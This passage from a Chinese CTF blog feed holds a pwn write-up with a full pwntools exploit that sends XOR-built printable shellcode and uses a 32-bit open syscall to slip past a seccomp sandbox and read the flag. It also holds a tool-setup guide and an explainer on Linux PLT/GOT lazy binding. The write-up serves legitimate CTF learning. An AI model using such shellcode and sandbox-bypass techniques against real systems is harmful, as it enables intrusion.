class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token char">'\x1F'</span> <span class="token operator">||</span> <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>i <span class="token operator">+</span> a1<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token char">'\x7F'</span> <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>      <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Oops!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="写shellcode"><a href="#写shellcode" class="headerlink" title="写shellcode"></a>写shellcode</h2><p><strong>调试<code>shellcode</code>的时候用<code>si</code>不要用<code>ni</code>！！</strong></p><h3 id="检查沙箱"><a href="#检查沙箱" class="headerlink" title="检查沙箱"></a>检查沙箱</h3><p>通过<code>check</code>之后开启沙箱，所以要执行到发送正确的消息之后才能用<code>seccomp-tools</code>查看沙箱情况，这里可以将<code>process</code>的参数设置为<code>seccomp-tools</code>即<code>r = process([&quot;seccomp-tools&quot;, &quot;dump&quot;, &quot;./pwn&quot;])</code>，发送完<code>msg</code>就会显示沙箱的情况</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"> line  CODE  JT   JF      K<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span> <span class="token number">0000</span><span class="token operator">:</span> <span class="token number">0x20</span> <span class="token number">0x00</span> <span class="token number">0x00</span> <span class="token number">0x00000000</span>  A <span class="token operator">=</span> sys_number <span class="token number">0001</span><span class="token operator">:</span> <span class="token number">0x35</span> <span class="token number">0x00</span> <span class="token number">0x01</span> <span class="token number">0x40000000</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>A <span class="token operator">&lt;</span> <span class="token number">0x40000000</span><span class="token punctuation">)</span> <span class="token keyword">goto</span> <span class="token number">0003</span> <span class="token number">0002</span><span class="token operator">:</span> <span class="token number">0x15</span> <span class="token number">0x00</span> <span class="token number">0x06</span> <span class="token number">0xffffffff</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>A <span class="token operator">!=</span> <span class="token number">0xffffffff</span><span class="token punctuation">)</span> <span class="token keyword">goto</span> <span class="token number">0009</span> <span class="token number">0003</span><span class="token operator">:</span> <span class="token number">0x15</span> <span class="token number">0x05</span> <span class="token number">0x00</span> <span class="token number">0x00000000</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>A <span class="token operator">==</span> read<span class="token punctuation">)</span> <span class="token keyword">goto</span> <span class="token number">0009</span> <span class="token number">0004</span><span class="token operator">:</span> <span class="token number">0x15</span> <span class="token number">0x04</span> <span class="token number">0x00</span> <span class="token number">0x00000001</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>A <span class="token operator">==</span> write<span class="token punctuation">)</span> <span class="token keyword">goto</span> <span class="token number">0009</span> <span class="token number">0005</span><span class="token operator">:</span> <span class="token number">0x15</span> <span class="token number">0x03</span> <span class="token number">0x00</span> <span class="token number">0x00000005</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>A <span class="token operator">==</span> fstat<span class="token punctuation">)</span> <span class="token keyword">goto</span> <span class="token number">0009</span> <span class="token number">0006</span><span class="token operator">:</span> <span class="token number">0x15</span> <span class="token number">0x02</span> <span class="token number">0x00</span> <span class="token number">0x00000025</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>A <span class="token operator">==</span> alarm<span class="token punctuation">)</span> <span class="token keyword">goto</span> <span class="token number">0009</span> <span class="token number">0007</span><span class="token operator">:</span> <span class="token number">0x15</span> <span class="token number">0x01</span> <span class="token number">0x00</span> <span class="token number">0x000000e7</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>A <span class="token operator">==</span> exit_group<span class="token punctuation">)</span> <span class="token keyword">goto</span> <span class="token number">0009</span> <span class="token number">0008</span><span class="token operator">:</span> <span class="token number">0x06</span> <span class="token number">0x00</span> <span class="token number">0x00</span> <span class="token number">0x00000000</span>  <span class="token keyword">return</span> KILL <span class="token number">0009</span><span class="token operator">:</span> <span class="token number">0x06</span> <span class="token number">0x00</span> <span class="token number">0x00</span> <span class="token number">0x7fff0000</span>  <span class="token keyword">return</span> ALLOW<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里限制了只能使用<code>read write fstat alarm exit_group</code>，程序是<code>64</code>位的，而<code>fstat</code>在<code>32</code>位中对应的函数就是<code>open</code>，所以可以使用<code>32</code>位的<code>open</code>和<code>64</code>位的<code>read write</code></p><h3 id="构造syscall"><a href="#构造syscall" class="headerlink" title="构造syscall"></a>构造syscall</h3><p>限制了可见字符且限制长度的情况下第一步就需要先构造一个<code>read</code>无限制的再读一次，而<code>syscall</code>的汇编字节是<code>0x0f05</code>不在可见字符范围内，所以需要通过异或构造，需要注意端序问题，小端序要反过来写进去，即<code>0x050f</code>，写在<code>shellcode</code>末尾用来异或的数值也要反过来写，我选择的是<code>0x66666963 ^ 0x66666c6c = 0x50f</code>，构造<code>shellcode</code>如下</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">push 0x66666963pop rsixor qword ptr [rax + 0x20], rsipush rbxpop rdixor al, 0x22push raxpop rsipush 0x66666963pop rdxpush rbxpop raxpush raxpush raxpush raxpush raxpush raxpush rax\x6c\x6c\x66\x66<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="架构切换调用open"><a href="#架构切换调用open" class="headerlink" title="架构切换调用open"></a>架构切换调用open</h3><p>使用汇编指令<code>retfq</code>切换架构，原理是改<code>cs</code>寄存器，当<code>cs</code>寄存器的值为<code>0x33</code>时识别为<code>64</code>位，当寄存器值位<code>0x23</code>时识别位<code>32</code>位，而<code>retfq</code>指令相当于<code>pop ip; pop cs</code>，所以需要先<code>push cs</code>再<code>push</code>需要执行的指令地址最后<code>retfq</code>切换架构</p><p>不过其实我没切换直接写<code>32</code>位的<code>shellcode</code>用<code>int 80</code>实现系统调用也能执行<code>open</code>…<code>shellcode</code>如下</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">mov  eax, 5push ecxpop  ebxmov  dword ptr [ecx], 0x6c662f2eadd  ecx, 4mov  dword ptr [ecx], 0x6761xor ecx, ecxxor edx, edxint  0x80<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> bot_pb2 <span class="token keyword">import</span> Msgbot<span class="token keyword">import</span> grpccontext<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>debug <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'challenge.yuanloo.com'</span><span class="token punctuation">,</span> <span class="token number">21231</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token triple-quoted-string string">'''push 0x66666963pop rsixor qword ptr [rax + 0x20], rsipush rbxpop rdixor al, 0x22push raxpop rsipush 0x66666963pop rdxpush rbxpop raxpush raxpush raxpush raxpush raxpush raxpush rax\x6c\x6c\x66\x66'''</span>msgcontent <span class="token operator">=</span> <span class="token string">b'\x68\x63\x69\x66\x66\x5e\x48\x31\x70\x20\x53\x5f\x34\x22\x50\x5e\x68\x63\x69\x66\x66\x5a\x53\x58'</span> <span class="token operator">+</span> <span class="token string">b'\x50'</span> <span class="token operator">*</span> <span class="token number">8</span> <span class="token operator">+</span> <span class="token string">b'\x6c\x6c\x66\x66'</span>msg <span class="token operator">=</span> Msgbot<span class="token punctuation">(</span><span class="token punctuation">)</span>msg<span class="token punctuation">.</span>msgid <span class="token operator">=</span> <span class="token number">0xC0DEFEED</span>msg<span class="token punctuation">.</span>msgsize <span class="token operator">=</span> <span class="token number">0xF00DFACE</span>msg<span class="token punctuation">.</span>msgcontent <span class="token operator">=</span> msgcontentserialized <span class="token operator">=</span> msg<span class="token punctuation">.</span>SerializeToString<span class="token punctuation">(</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'botmsg'</span><span class="token punctuation">,</span> serialized<span class="token punctuation">)</span><span class="token triple-quoted-string string">'''mov  eax, 5push ecxpop  ebxmov  dword ptr [ecx], 0x6c662f2eadd  ecx, 4mov  dword ptr [ecx], 0x6761xor ecx, ecxxor edx, edxint  0x80'''</span>shellcode <span class="token operator">=</span> <span class="token string">b"\xb8\x05\x00\x00\x00\x51\x5b\xc7\x01\x2e\x2f\x66\x6c\x83\xc1\x04\xc7\x01\x61\x67\x00\x00\x31\xc9\x31\xd2\xcd\x80"</span>shellcode <span class="token operator">+=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token string">'rsp'</span><span class="token punctuation">,</span> <span class="token number">0x30</span><span class="token punctuation">)</span><span class="token punctuation">)</span>shellcode <span class="token operator">+=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">'rsp'</span><span class="token punctuation">,</span><span class="token number">0x30</span><span class="token punctuation">)</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;本题来源于源鲁杯第一轮&lt;code&gt;pwn&lt;/code&gt;的困难题，向程序发送了&lt;code&gt;msg&lt;/code&gt;之后会判定是否符合&lt;code&gt;proto&lt;/code&gt;结构，符合则开启沙箱仅允许执行&lt;code&gt;read、write、fstat、alarm、exit_group&lt;/</summary>
      
    
    
    
    <category term="WP" scheme="https://starrysky1004.github.io/categories/WP/"/>
    
    
    <category term="pwn" scheme="https://starrysky1004.github.io/tags/pwn/"/>
    
    <category term="shellcode" scheme="https://starrysky1004.github.io/tags/shellcode/"/>
    
    <category term="protobuf" scheme="https://starrysky1004.github.io/tags/protobuf/"/>
    
  </entry>
  
  <entry>
    <title>pwn环境配置</title>
    <link href="https://starrysky1004.github.io/2024/10/05/pwn-huan-jing-pei-zhi/"/>
    <id>https://starrysky1004.github.io/2024/10/05/pwn-huan-jing-pei-zhi/</id>
    <published>2024-10-05T09:04:55.000Z</published>
    <updated>2024-12-10T07:15:56.284Z</updated>
    
    <content type="html"><![CDATA[<p>视频版：<a href="https://www.bilibili.com/video/BV1YT1oYeEVd">https://www.bilibili.com/video/BV1YT1oYeEVd</a></p><h2 id="更新、安装vim"><a href="#更新、安装vim" class="headerlink" title="更新、安装vim"></a>更新、安装vim</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt</span> upgrade<span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> <span class="token function">vim</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="安装必要环境"><a href="#安装必要环境" class="headerlink" title="安装必要环境"></a>安装必要环境</h2><p>将一下内容写入一个<code>sh</code>脚本文件中，为<code>chmod 777 xxx.sh</code>文件赋权限后直接<code>./xxx.sh</code>运行脚本，中途会出现<code>Do you want to continue? [Y/n]</code>输入<code>y</code></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span><span class="token builtin class-name">cd</span> ~<span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> tzdata<span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> <span class="token function">vim</span><span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> libxml2-dev<span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> libxslt-dev<span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> libmysqlclient-dev<span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> libsqlite3-dev<span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> zlib1g-dev<span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> python2-dev<span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> python3-pip<span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> libffi-dev<span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> libssl-dev<span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> <span class="token function">wget</span><span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> <span class="token function">curl</span><span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> gcc<span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> clang<span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> <span class="token function">make</span><span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> <span class="token function">zip</span><span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> build-essential<span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> libncursesw5-dev libgdbm-dev libc6-dev<span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> tk-dev<span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> openssl<span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> virtualenv<span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> <span class="token function">git</span><span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> proxychains4<span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> ruby-dev<span class="token comment">#setuptools 36.6.1 -> python2</span><span class="token function">wget</span> https://mirrors.aliyun.com/pypi/packages/56/a0/4dfcc515b1b993286a64b9ab62562f09e6ed2d09288909aee1efdb9dde16/setuptools-36.6.1.zip<span class="token function">unzip</span> setuptools-36.6.1.zip<span class="token builtin class-name">cd</span> setuptools-36.6.1<span class="token function">sudo</span> python2 setup.py <span class="token function">install</span><span class="token builtin class-name">cd</span> <span class="token punctuation">..</span>/<span class="token function">sudo</span> <span class="token function">rm</span> <span class="token parameter variable">-rf</span> setuptools-36.6.1 setuptools-36.6.1.zip<span class="token comment">#setuptools 65.4.1 -> python3</span><span class="token function">wget</span> https://mirrors.aliyun.com/pypi/packages/03/c9/7b050ea4cc4144d0328f15e0b43c839e759c6c639370a3b932ecf4c6358f/setuptools-65.4.1.tar.gz<span class="token function">tar</span> <span class="token parameter variable">-zxvf</span> setuptools-65.4.1.tar.gz<span class="token builtin class-name">cd</span> setuptools-65.4.1<span class="token function">sudo</span> python3 setup.py <span class="token function">install</span><span class="token builtin class-name">cd</span> <span class="token punctuation">..</span>/<span class="token function">sudo</span> <span class="token function">rm</span> <span class="token parameter variable">-rf</span> setuptools-65.4.1 setuptools-65.4.1.tar.gz<span class="token comment">#pip</span><span class="token function">wget</span> https://mirrors.aliyun.com/pypi/packages/53/7f/55721ad0501a9076dbc354cc8c63ffc2d6f1ef360f49ad0fbcce19d68538/pip-20.3.4.tar.gz<span class="token function">tar</span> <span class="token parameter variable">-zxvf</span> pip-20.3.4.tar.gz<span class="token builtin class-name">cd</span> pip-20.3.4<span class="token function">sudo</span> python2 setup.py <span class="token function">install</span><span class="token function">sudo</span> python3 setup.py <span class="token function">install</span><span class="token builtin class-name">cd</span> <span class="token punctuation">..</span>/<span class="token function">sudo</span> <span class="token function">rm</span> <span class="token parameter variable">-rf</span> pip-20.3.4 pip-20.3.4.tar.gz<span class="token function">sudo</span> pip2 config <span class="token builtin class-name">set</span> global.index-url https://mirrors.aliyun.com/pypi/simple<span class="token function">sudo</span> pip3 config <span class="token builtin class-name">set</span> global.index-url https://mirrors.aliyun.com/pypi/simple<span class="token function">sudo</span> python2 <span class="token parameter variable">-m</span> pip <span class="token function">install</span> <span class="token parameter variable">--upgrade</span> pip<span class="token function">sudo</span> python3 <span class="token parameter variable">-m</span> pip <span class="token function">install</span> <span class="token parameter variable">--upgrade</span> pippip3 <span class="token function">install</span> <span class="token parameter variable">--upgrade</span> pip<span class="token function">sudo</span> pip2 <span class="token function">install</span> pathlib2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="配置pwn环境"><a href="#配置pwn环境" class="headerlink" title="配置pwn环境"></a>配置pwn环境</h2><h3 id="pwntools"><a href="#pwntools" class="headerlink" title="pwntools"></a>pwntools</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> python2 <span class="token parameter variable">-m</span> pip <span class="token function">install</span> <span class="token parameter variable">--upgrade</span> pwntools<span class="token function">sudo</span> python3 <span class="token parameter variable">-m</span> pip <span class="token function">install</span> <span class="token parameter variable">--upgrade</span> pwntools<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="pwndbg-Pwngdb"><a href="#pwndbg-Pwngdb" class="headerlink" title="pwndbg+Pwngdb"></a>pwndbg+Pwngdb</h3><p>这里我直接去<code>github</code>下载运行<code>setup.sh</code>会报错要求升级<code>python3</code>，所以直接把原来虚拟机里的打包复制过来了</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">wget</span> https://starrysky1004.github.io/pwnenv.zip<span class="token function">unzip</span> pwnenv.zip<span class="token function">rm</span> pwnenv.zip<span class="token comment">#pwndbg</span><span class="token builtin class-name">cd</span> pwndbg./setup.sh<span class="token comment">#Pwngdb</span><span class="token builtin class-name">cd</span> ~/<span class="token function">cp</span> ~/Pwngdb/.gdbinit ~/<span class="token function">vim</span> ~/.gdbinit<span class="token comment">#注释掉第一行 然后在第二行写入</span><span class="token builtin class-name">source</span> ~/pwndbg/gdbinit.py<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="patchelf"><a href="#patchelf" class="headerlink" title="patchelf"></a>patchelf</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> patchelf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="glibc-all-in-one"><a href="#glibc-all-in-one" class="headerlink" title="glibc-all-in-one"></a>glibc-all-in-one</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#glibc-all-in-one</span><span class="token function">git</span> clone https://github.com/matrix1001/glibc-all-in-one.git<span class="token builtin class-name">cd</span> glibc-all-in-onepython3 update_list<span class="token function">cat</span> list<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="ropper"><a href="#ropper" class="headerlink" title="ropper"></a>ropper</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> pip3 <span class="token function">install</span> capstone filebytes unicorn keystone-engine ropper<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="qemu-system"><a href="#qemu-system" class="headerlink" title="qemu-system"></a>qemu-system</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> qemu-system<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="Ropgadget"><a href="#Ropgadget" class="headerlink" title="Ropgadget"></a>Ropgadget</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token parameter variable">-H</span> python3 <span class="token parameter variable">-m</span> pip <span class="token function">install</span> ROPgadget<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="one-gadget、seccomp-tools"><a href="#one-gadget、seccomp-tools" class="headerlink" title="one_gadget、seccomp-tools"></a>one_gadget、seccomp-tools</h3><p>这两个我感觉很随缘，没事运行一下看运气吧（</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> gem <span class="token function">install</span> one_gadget<span class="token function">sudo</span> gem <span class="token function">install</span> seccomp-tools<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>推荐装个<code>oh-my-zsh</code>，主题多、好看，而且可以<code>Tab</code>选择文件以及回滚以前输入的命令</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;视频版：&lt;a href=&quot;https://www.bilibili.com/video/BV1YT1oYeEVd&quot;&gt;https://www.bilibili.com/video/BV1YT1oYeEVd&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;更新、安装vim&quot;&gt;&lt;a href=&quot;</summary>
      
    
    
    
    <category term="pwn" scheme="https://starrysky1004.github.io/categories/pwn/"/>
    
    
    <category term="pwn" scheme="https://starrysky1004.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>Linux延迟绑定机制过程</title>
    <link href="https://starrysky1004.github.io/2024/09/26/linux-yan-chi-bang-ding-ji-zhi-guo-cheng/linux-yan-chi-bang-ding-ji-zhi-guo-cheng/"/>
    <id>https://starrysky1004.github.io/2024/09/26/linux-yan-chi-bang-ding-ji-zhi-guo-cheng/linux-yan-chi-bang-ding-ji-zhi-guo-cheng/</id>
    <published>2024-09-26T09:51:38.000Z</published>
    <updated>2024-09-26T13:46:46.158Z</updated>
    
    <content type="html"><![CDATA[<p>学<code>pwn</code>的时候了解到<code>linux</code>存在延迟绑定机制，延迟绑定之后<code>plt-&gt;got-&gt;函数真实地址</code>，这两天比赛遇到问题了才去关注了一下延迟绑定的具体过程</p><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>延迟绑定是当函数第一次被调用的时候才进行绑定（包括符号查找、重定位等），如果函数不被调用就不进行绑定。延迟绑定机制可以大大加快程序的启动速度，特别有利于一些引用了大量函数的程序。</p><h2 id="过程分析"><a href="#过程分析" class="headerlink" title="过程分析"></a>过程分析</h2><p>以调用<code>system</code>函数为例，汇编中<code>call system</code>时会调用<code>system_plt</code>，而<code>system_plt</code>中是三条汇编指令（不是<code>system_got</code>地址），其中第一条是<code>jmp system_got</code>，<code>system_plt</code>内容如下：</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">.plt:0000000000401050 ; int system(const char *command).plt:0000000000401050 _system         proc near               .plt:0000000000401050                 jmp     cs:off_403660;system_got.plt:0000000000401050 _system         endp.plt:0000000000401050.plt:0000000000401056 ; ---------------------------------------------------------------------------.plt:0000000000401056                 push    2.plt:000000000040105B                 jmp     sub_401020<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>第一次调用<code>system</code>时，<code>system_got</code>中并没有<code>system</code>的真实地址，而是<code>system_plt</code>中第二条指令的地址，即<code>push 2</code>之后跳转到<code>sub_401020</code></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">pwndbg<span class="token operator">></span> x/20gx 0x4036600x403660 <span class="token operator">&lt;</span>system@got.plt<span class="token operator">></span>:0x00000000004010560x00007ffff7e21c90<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>其中函数<code>sub_401020</code>内容如下</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">.plt:0000000000401020 sub_401020      proc near               ; CODE XREF: .plt:000000000040103B↓j.plt:0000000000401020                                         ; .plt:000000000040104B↓j ....plt:0000000000401020 ; __unwind &#123;.plt:0000000000401020                 push    cs:qword_403640.plt:0000000000401026                 jmp     cs:qword_403648.plt:0000000000401026 sub_401020      endp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>qword_403640</code>和<code>qword_403648</code>存在于<code>got</code>表中，<code>got</code>表内容如下</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">.got.plt:0000000000403638 _got_plt        segment qword public &#39;DATA&#39; use64.got.plt:0000000000403638                 assume cs:_got_plt.got.plt:0000000000403638                 ;org 403638h.got.plt:0000000000403638                 dq offset stru_403458.got.plt:0000000000403640 qword_403640    dq 0                    ;linkmap_ptr.got.plt:0000000000403648 qword_403648    dq 0                    ;dl_runtime_resolve.got.plt:0000000000403650 off_403650      dq offset puts          .got.plt:0000000000403658 off_403658      dq offset setbuf        .got.plt:0000000000403660 off_403660      dq offset system        .got.plt:0000000000403668 off_403668      dq offset printf        .got.plt:0000000000403670 off_403670      dq offset memset       .got.plt:0000000000403678 off_403678      dq offset read         .got.plt:0000000000403680 off_403680      dq offset __isoc99_scanf.got.plt:0000000000403688 off_403688      dq offset exit          .got.plt:0000000000403688 _got_plt        ends<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>got[0]</code>和<code>got[1]</code>（即<code>qword_403640</code>和<code>qword_403648</code>）分别是<code>linkmap</code>和<code>dl_runtime_resolve</code></p><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; x&#x2F;2gx 0x4036400x403640:0x00007ffff7ffe1900x00007ffff7fe7bc0pwndbg&gt; x&#x2F;gx 0x00007ffff7fe7bc00x7ffff7fe7bc0 &lt;_dl_runtime_resolve_xsavec&gt;:0xe3894853fa1e0ff3<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>所以函数<code>sub_401020</code>就是将<code>linkmap</code>入栈并跳转到<code>dl_runtime_resolve</code>寻找函数真实地址，找到真实地址之后会更新<code>system_got</code>内容为<code>system</code>函数的真实地址</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">pwndbg<span class="token operator">></span> x/gx 0x00000000004036600x403660 <span class="token operator">&lt;</span>system@got.plt<span class="token operator">></span>:0x00007fad32b74290<span aria-hidden="true" 